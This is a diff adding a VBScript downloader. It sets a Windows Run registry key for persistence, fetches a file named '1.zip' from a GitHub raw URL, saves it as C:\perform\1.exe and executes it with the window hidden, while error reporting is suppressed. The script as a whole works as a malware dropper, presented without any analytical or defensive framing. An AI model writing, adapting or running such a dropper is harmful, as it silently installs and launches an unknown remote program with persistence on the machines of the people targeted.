@@ -1,0 +1,39 @@
+Set objShell = CreateObject("Wscript.Shell")
+objShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\windows","C:\Perform\window.exe","REG_SZ"
+
+
+On Error resume next
+din errdesc
+url = "https://raw.githubusercontent.com/cachorrodoido/kk/main/1.zip"
+Set http = CreateObject("MSXML2.ServerXMLHTTP")
+http.open "GET",url,false
+http.send
+errdesc=err.description
+
+If http.Status = 200 Then
+ Set objShell = CreateObject( "WScript.Shell" )
+
+dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
+dim bStrm: Set bStrm = createobject("Adodb.Stream")
+xHttp.Open "GET", "https://raw.githubusercontent.com/cachorrodoido/kk/main/1.zip", False
+xHttp.Send
+
+with bStrm
+    .type = 1 '//binary
+    .open
+    .write xHttp.responseBody
+    .savetofile "C:\perform\1.exe", 2 '//overwrite
+end with
+Set objShell = CreateObject("WScript.Shell")
+Set objFSO = CreateObject("Scripting.FileSystemObject")
+set objSh = CreateObject("WScript.Shell")
+objSh.Run "C:\perform\1.exe", 0
+
+
+Wscript.Quit
+ 
+ElseIf http.Status > 400 And http.Status < 500 Then
+  
+
+    Wscript.Quit
+end if
